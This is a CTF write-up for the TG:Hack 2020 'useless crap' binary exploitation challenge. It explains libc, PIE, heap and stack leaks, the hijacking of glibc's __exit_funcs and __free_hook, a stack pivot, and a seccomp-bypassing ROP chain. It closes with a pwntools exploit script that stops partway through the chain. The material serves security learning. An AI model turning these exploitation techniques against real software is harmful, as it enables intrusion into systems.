I"©¢<p>This was a fun ctf, even though I spent most of my time on a single challnge (called ‚Äòuseless crap‚Äô). I learned a lot doing this challenge, and thought I would make a writeup because as far a I know (from the 2 places I‚Äôve looked) this is a unique solution with some cool tricks.</p>

<!--more-->

<h2 id="the-challenge">The challenge</h2>

<p>From the challenge page we get 3 files- the binary (called <code class="highlighter-rouge">crap</code>), a libc (version 2.31) and a dynamic linker/loader ld-2.31.so. By running patchelf we see there‚Äôs another needed library, libseccomp.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ patchelf --print-needed ./crap
libseccomp.so.2
libc.so.6
</code></pre></div></div>

<p>I already had this library in /lib64/, and put a copy in the challenge directory. I used patchelf to set all the needed libraries/linker in the binary ELF in order to run it</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ patchelf --add-needed ./libseccomp.so.2 ./crap
$ patchelf --add-needed ./libc-2.31.so ./crap
$ patchelf --set-interpreter ./ld-2.31.so ./crap
</code></pre></div></div>

<p>After checking the protections enabled with <code class="highlighter-rouge">checksec</code>, it looks like this is a 64bit binary with everything enabled:</p>

<p><img src="/assets/images/tghack2020/checksec.jpg" alt="checksec" /></p>

<p>When we run the binary, we get a simple menu with 3 options</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./crap
1. read
2. write
3. exit
&gt;
</code></pre></div></div>

<p>I then opened up the binary in the <a href="https://github.com/radareorg/cutter">cutter</a> disassembler to look at what the options do. At this point I found 2 more options, accessed by sending ‚Äò4‚Äô and ‚Äò5‚Äô. Here is a summary of what each do:</p>

<ul>
  <li>1 read: reads memory at a user supplied address. There is a limit of 2 reads allowed, enforced by checking if a global signed integer is &gt; 1</li>
  <li>2 write: writes a user supplied value at a user supplied address. Same limit mechanism as read option</li>
  <li>3 exit: Asks the user for some feedback- first some memory is allocated with <code class="highlighter-rouge">calloc(0x501, 1)</code> then filled with <code class="highlighter-rouge">fgets</code>. Additionally, after writing their feedback the user is asked if they want to keep their feedback. If they answer ‚Äòn‚Äô the feedback buffer is <code class="highlighter-rouge">free()</code>‚Äòd, but <em>not</em> set to NULL.
  You can only provide feedback once- this is enforced by checking if the feedback buffer is NULL</li>
  <li>4 view_feedback: calls <code class="highlighter-rouge">printf("%s")</code> on the feedback buffer</li>
  <li>5 actual <code class="highlighter-rouge">exit()</code></li>
</ul>

<p>It‚Äôs nice that the challenge gives us arbitrary r/w for free, now we need some address leaks to work with.</p>

<p>Because of its size, the allocated feedback chunk is placed into the unsorted bin when <code class="highlighter-rouge">free()</code>‚Äòd. This means that its forward and backward pointers will point inside of <code class="highlighter-rouge">main_arena</code> (+96) in libc. These pointers are written where the user data used to be in the heap chunk, so if we send menu option ‚Äò4‚Äô to view the feedback after freeing it will call <code class="highlighter-rouge">printf()</code> on one of these pointers, and so we can read the address of <code class="highlighter-rouge">main_arena+96</code> and use that to obtain the base of libc.</p>

<p>There‚Äôs a lot you can do with a libc leak + an arbitrary read, like leaking the address of every other segment in the process memory.</p>

<p><br /></p>

<h2 id="leaking-every-segment-from-libc">Leaking every segment from libc</h2>

<h3 id="text">.text</h3>

<p>If you look at the binary in gdb and run <code class="highlighter-rouge">vmmap</code>, you will see that the dynamic linker/loader <code class="highlighter-rouge">ld</code> program has its own segment in memory. The value the .text segment is loaded in at will be stored in this segment.</p>

<p>If you want to check, find the value of the binary base in your gdb session using <code class="highlighter-rouge">vmmap</code>, then use the search functionality (<code class="highlighter-rouge">search</code> in pwndbg or <code class="highlighter-rouge">search-pattern</code> in gef) to search for this value in memory. If found, it will probably be in this ld.so section</p>

<p>What does this mean? The way ASLR is currently implemented (on Linux) is the shared libraries are grouped in a single ‚Äòblock‚Äô, and only the start of this block is randomised, not the start of each individual shared library. This means the offset from the base of libc to any point in the shared library block (which includes the ld.so segment) will be constant.</p>

<p>So all we have to do is calculate the offset from to the binary base value in the ld.so segment and read there- we‚Äôve leaked the .text segment address and defeated PIE</p>

<h3 id="heap">heap</h3>

<p>The <code class="highlighter-rouge">main_arena</code> will have heap pointers, so you can perform a read there.</p>

<p>For the ctf challenge, reading at the leak we are given (<code class="highlighter-rouge">main_arena+96</code>) will give us a heap address.</p>

<h3 id="stack">stack</h3>

<p>There is a pointer to the <code class="highlighter-rouge">char **envp</code> argument to <code class="highlighter-rouge">main</code> inside libc. In pwntools, the offset to this can be obtained with <code class="highlighter-rouge">libc.symbols['environ']</code>. Reading here will give us a stack leak, defeating ASLR.</p>

<p><br /></p>

<h2 id="libseccomp">libseccomp</h2>

<p>There was another function call in the challenge I haven‚Äôt mentioned yet- in main there is a call to a function called <code class="highlighter-rouge">sandbox</code>, which calls some libseccomp functions. If you manage to call something like <code class="highlighter-rouge">system("/bin/sh")</code> with the binary you would hit a SIGSYS signal, ‚Äúbad system call‚Äù</p>

<p><a href="https://github.com/seccomp/libseccomp">libseccomp</a> is an API to the kernel‚Äôs Berkeley Packet Filter syscall filtering mechanism. Basically, it abstracts the filter language away into a function call based interface and can be used to do things like whitelist which syscalls to allow and which file descriptions can be read from/written to.</p>

<p><a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a> is a nice tool that can dump the filter rules for seccomp sandboxes. Running it on the challenge binary, we see the following:</p>

<p><img src="/assets/images/tghack2020/seccomptools.jpg" alt="seccomptools" /></p>

<p>The <code class="highlighter-rouge">open</code>, <code class="highlighter-rouge">close</code>, <code class="highlighter-rouge">mprotect</code>, and <code class="highlighter-rouge">exit_group</code> syscalls are allowed without conditions, while <code class="highlighter-rouge">read</code> and <code class="highlighter-rouge">write</code> have some checks on the file descriptor used- specifically, you can only read from fd 0 (stdin) and write to fd 0 and 1 (stdin and stdout)</p>

<p>Trying to execute other syscalls like <code class="highlighter-rouge">execve</code> will result in a SIGSYS signal stopping the program.</p>

<h2 id="solving-the-challenge">Solving the challenge</h2>

<p>After leaking libc by reading the feedback chunk, we use the ‚Äòread‚Äô option in the menu to read inside the ld.so segment and get a .text leak, as described above.</p>

<p>We can then calculate the address of the integer used for keeping track of write counts and use the ‚Äòwrite‚Äô menu option to set this value some negative number, effectively giving us infinite arbitrary writes. Now what?</p>

<p>We <em>could</em> set the feedback buffer pointer to NULL, write over <code class="highlighter-rouge">__malloc_hook</code>/<code class="highlighter-rouge">__free_hook</code> and call the set_feedback function again, but what would we put over the hook? A one_gadget wouldn‚Äôt work since <code class="highlighter-rouge">execve</code> is disabled, so it seems like we can‚Äôt use this option right now.</p>

<p>We can get <code class="highlighter-rouge">exit()</code> called, and I knew that overwriting the <code class="highlighter-rouge">_exit_funcs</code> variable in libc did‚Ä¶ something during <code class="highlighter-rouge">exit()</code>. On a whim I went with this to see what would happen.</p>

<p>First lets look at the disassembly for <code class="highlighter-rouge">exit()</code> to get an idea of what would happen</p>

<p><img src="/assets/images/tghack2020/exit.jpg" alt="exit" /></p>

<p>This loads <code class="highlighter-rouge">__exit_funcs</code> as one of the arguments to <code class="highlighter-rouge">__run_exit_handlers</code> (<a href="https://code.woboq.org/userspace/glibc/stdlib/exit.c.html">source</a>), which does the actual heavy lifting. <code class="highlighter-rouge">__exit_funcs</code> is treated as a list of functions to be called, and is normally populated by calling functions like <code class="highlighter-rouge">atexit()</code>, and by default contains a pointer that points to <code class="highlighter-rouge">NULL</code>. We can‚Äôt use this variable to get code execution because of (pointer guard)[https://sourceware.org/glibc/wiki/PointerEncryption], which obfuscates the function pointers used in this function.</p>

<p><img src="/assets/images/tghack2020/pointerguard.jpg" alt="pointerguard" /></p>

<p>However, looking at the source code for <code class="highlighter-rouge">__run_exit_handlers</code> there is a call to <code class="highlighter-rouge">free()</code> in the function execution loop. We could get code execution using <code class="highlighter-rouge">__free_hook</code> if we reach this (full disclaimer, I didn‚Äôt think about using the hooks discussed previously during the challenge, so I thought calling free from <code class="highlighter-rouge">__run_exit_handlers</code> was the only way to reach <code class="highlighter-rouge">__free_hook</code>, however this turned out to be to my benefit).</p>

<p><img src="/assets/images/tghack2020/free.jpg" alt="free" /></p>

<p>If we point the <code class="highlighter-rouge">__exit_funcs</code> variable to our feedback chunk in the heap (which we know the location of because of the heap leak) we might have some control over how <code class="highlighter-rouge">__run_exit_handlers</code> executes. I did this and called <code class="highlighter-rouge">exit()</code> from the menu</p>

<p>Some amount of dynamic analysis later I found that if you point <code class="highlighter-rouge">__exit_funcs</code> to memory containing 8 bytes of arbitrary data followed by 8 bytes of zeroes (a full NULL ptr) you will hit the call to <code class="highlighter-rouge">free()</code>, with some particularly interesting values in the registers:</p>

<p><img src="/assets/images/tghack2020/regs.jpg" alt="regs" /></p>

<p>Of particular interest is <code class="highlighter-rouge">$rbp</code>- it points to the <code class="highlighter-rouge">__exit_funcs</code> variable in libc (which was set to point to our heap chunk, but at some point in <code class="highlighter-rouge">__run_exit_handlers</code> this was changed- ultimately this doesn‚Äôt matter). At this point I thought some sort of stack pivot into libc might be possible so I searched for gadgets, and managed to find this:</p>

<p><img src="/assets/images/tghack2020/gadget.jpg" alt="gadget" /></p>

<p>This is the magic gadget that allowed me to solve the challenge- <code class="highlighter-rouge">$rsp</code> is set above <code class="highlighter-rouge">$rbp</code> but we pop 3 times, ending up with <code class="highlighter-rouge">$rsp</code> pointing to the value right after <code class="highlighter-rouge">__exit_funcs</code>. This is still in a rw segment and we effectively have infinite writes, so we can place a ROP chain here.</p>

<p>Quick recap on how we got here:</p>

<ul>
  <li>Provide feedback such that we have 8 bytes of arbitrary data followed by 8 bytes of zeroes somewhere in the heap chunk- note this should be atleast after 0x20 bytes of arbitrary data since <code class="highlighter-rouge">free()</code> will overwrite some user data</li>
  <li><code class="highlighter-rouge">free()</code> the chunk and read the feedback to get a libc leak</li>
  <li>Use the libc leak + arbitrary read to leak the .text segment and the heap address</li>
  <li>Write over the write count with some large negative number to get infinite writes</li>
  <li>Write over <code class="highlighter-rouge">__free_hook</code> with our stack pivot gadget</li>
  <li>Write over <code class="highlighter-rouge">__exit_funcs</code> with a pointer to our heap data</li>
  <li>Call <code class="highlighter-rouge">exit()</code> with menu option ‚Äò5‚Äô-&gt; <code class="highlighter-rouge">__run_exit_handlers</code> is called -&gt; <code class="highlighter-rouge">free()</code> + <code class="highlighter-rouge">__free_hook</code> is called-&gt; pivot gadget triggers and we <code class="highlighter-rouge">ret</code> to whatever address is stored right after <code class="highlighter-rouge">__exit_funcs</code>.</li>
</ul>

<h3 id="rop-chain">ROP chain</h3>

<p>So we have the ability to return to a ROP chain, but what do we do? Looking back at the seccomp rules, we can‚Äôt call execve to get a shell. We could open the flag file, but its assigned file descriptor won‚Äôt be 0 so we can‚Äôt read from it.</p>

<p>We DO have access to the <code class="highlighter-rouge">close</code> syscall however, so we can just close fd 0! If we call <code class="highlighter-rouge">open</code> after that to open the flag file, it will be assigned fd 0, which we can read from according to the seccomp rules. After that it‚Äôs a simple matter of reading the flag into a buffer and writing it to stdout- challenge solved.</p>

<h3 id="exploit-script">exploit script</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">angr</span><span class="p">,</span> <span class="n">angrop</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"amd64"</span>
<span class="n">c</span> <span class="o">=</span> <span class="n">constants</span>

<span class="n">PROGNAME</span> <span class="o">=</span> <span class="s">"./crap"</span>
<span class="c1"># didnt get it working remotely
</span><span class="n">REMOTE</span> <span class="o">=</span> <span class="s">"crap.tghack.no"</span>
<span class="n">REMOTEPORT</span> <span class="o">=</span> <span class="mi">6001</span>

<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">REMOTE</span><span class="p">,</span> <span class="n">REMOTEPORT</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">PROGNAME</span><span class="p">)</span>

<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">PROGNAME</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">libc</span>

<span class="c1">########## Helper functions ##############
</span>
<span class="c1"># generates our ROP chain
</span><span class="k">def</span> <span class="nf">get_chain</span><span class="p">(</span><span class="n">path_buf</span><span class="p">,</span> <span class="n">flag_buf</span><span class="p">,</span> <span class="n">base</span><span class="p">):</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">angr</span><span class="o">.</span><span class="n">Project</span><span class="p">(</span><span class="s">"./libc-2.31.so"</span><span class="p">)</span>
    <span class="n">rop</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">analyses</span><span class="o">.</span><span class="n">ROP</span><span class="p">()</span>
    <span class="n">gadget_file</span> <span class="o">=</span> <span class="s">".gadgets-crap"</span>
    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">gadget_file</span><span class="p">):</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">load_gadgets</span><span class="p">(</span><span class="n">gadget_file</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">gadget_file</span><span class="p">,</span> <span class="s">"wb+"</span><span class="p">):</span>
            <span class="k">pass</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">find_gadgets</span><span class="p">()</span>
        <span class="n">rop</span><span class="o">.</span><span class="n">save_gadgets</span><span class="p">(</span><span class="n">gadget_file</span><span class="p">)</span>
    <span class="c1"># reference: https://github.com/salls/angrop
</span>    <span class="n">chain</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">write_to_mem</span><span class="p">(</span><span class="n">path_buf</span><span class="p">,</span> <span class="n">b</span><span class="s">"/flag</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
    <span class="n">chain</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">do_syscall</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="p">[</span><span class="mi">0</span><span class="p">])</span>                         <span class="c1"># close fd 0
</span>    <span class="n">chain</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">do_syscall</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">[</span><span class="n">path_buf</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">O_RDONLY</span><span class="p">,</span> <span class="mi">0</span><span class="p">])</span>  <span class="c1"># open flag-&gt;fd 0
</span>    <span class="n">chain</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">do_syscall</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="n">flag_buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">])</span>        <span class="c1"># read-&gt;flag_buf
</span>    <span class="n">chain</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">do_syscall</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="n">flag_buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">])</span>        <span class="c1"># write flag_buf-&gt;stdout
</span>    <span class="c1">#print(chain.print_payload_code())
</span>    <span class="k">return</span> <span class="n">chain</span><span class="o">.</span><span class="n">payload_str</span><span class="p">(</span><span class="n">base_addr</span><span class="o">=</span><span class="n">base</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">menu</span><span class="p">():</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">get_leak</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"feedback: "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'(y/n)'</span><span class="p">,</span> <span class="s">'n'</span><span class="p">)</span>
    <span class="n">menu</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'4'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'feedback: '</span><span class="p">)</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># trim /n
</span>    <span class="n">diff</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
    <span class="n">leak</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="n">diff</span>    <span class="c1"># pad to 8 bytes
</span>    <span class="n">menu</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">write_addr</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">where</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="n">what</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'value:'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">menu</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">read_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'addr: '</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'0x'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">menu</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="c1"># assume we have enough writes
</span><span class="k">def</span> <span class="nf">write_block</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">):</span>
    <span class="c1"># split payload into 8 bytes chunks
</span>    <span class="n">n</span> <span class="o">=</span> <span class="mi">8</span>
    <span class="n">chunk_list</span> <span class="o">=</span> <span class="p">[</span> <span class="n">what</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">n</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">what</span><span class="p">),</span> <span class="n">n</span><span class="p">)</span> <span class="p">]</span>
    <span class="n">cur_where</span> <span class="o">=</span> <span class="n">where</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chunk_list</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>
        <span class="n">diff</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
        <span class="n">c</span> <span class="o">=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="n">diff</span> <span class="o">+</span> <span class="n">c</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">cur_where</span><span class="p">)</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'value:'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
        <span class="n">menu</span><span class="p">()</span>
        <span class="n">cur_where</span> <span class="o">+=</span> <span class="mh">0x8</span>

<span class="c1">########## Solution #############
</span><span class="n">menu</span><span class="p">()</span>
<span class="c1"># leak is at main_arena+96, diff of 0x3b5be0 from base of libc
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x20</span> <span class="o">+</span> <span class="n">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">8</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">get_leak</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'leaked 0x</span><span class="si">%</span><span class="s">x'</span> <span class="o">%</span> <span class="n">leak</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3b5be0</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>

<span class="c1"># get heap leak by reading main arena leak
</span><span class="n">heap_leak</span> <span class="o">=</span> <span class="n">read_addr</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
<span class="n">input_addr</span> <span class="o">=</span> <span class="n">heap_leak</span> <span class="o">-</span> <span class="mh">0x1240</span>       <span class="c1"># offset in chunk to user data
</span>

<span class="c1"># binary base in linker at main_arena leak + 0x22e900
</span><span class="n">bin_base</span> <span class="o">=</span> <span class="n">read_addr</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="o">+</span><span class="mh">0x22e900</span><span class="p">))</span>
<span class="n">e</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">bin_base</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"binary base at 0x</span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="n">e</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
<span class="n">review</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x202038</span>
<span class="n">write_count</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x202034</span>
<span class="n">read_count</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mi">202030</span>

<span class="c1"># some writable part of memory to put flag path/contents
</span><span class="n">buf_target</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x202050</span>

<span class="n">write_addr</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">write_count</span><span class="p">),</span> <span class="s">"-0x500"</span><span class="p">)</span>      <span class="c1"># get more writes
</span>
<span class="c1"># mov rsp, rbx; lea rsp, [rbp - 0x10]; pop rbx; pop r12; pop rbp; ret;
</span><span class="n">pivot_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xc536b</span>

<span class="n">exit_funcs</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x3b5718</span>
<span class="n">base_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span>

<span class="c1">#get_chain(buf_target, buf_target+0x20, base_addr)
# chain was generated with get_chain() and copied here
# seems to not work if just returned as bytes
</span><span class="n">chain</span> <span class="o">=</span> <span class="n">b</span><span class="s">""</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x12c561</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># pop rax; pop rdx; pop rbx; ret
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffff0067616c662f</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_target</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7d597</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># mov qword ptr [rdx], rax; ret
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x39000</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># pop rax; ret
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xc4cc0</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># pop rdi; ret
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x39049</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># syscall
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xc4cc0</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># pop rdi; ret
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_target</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x221ba</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># mov esi, 0x415b0007; pop rsi; ret
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x12c561</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># pop rax; pop rdx; pop rbx; ret
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x39049</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># syscall
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xc4cc0</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># pop rdi; ret
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x221ba</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># mov esi, 0x415b0007; pop rsi; ret
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_target</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x12c561</span> <span class="o">+</span> <span class="n">base_addr</span><span class="p">)</span>    <span class="c1"># pop rax; pop rdx; pop rbx; ret
</span><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
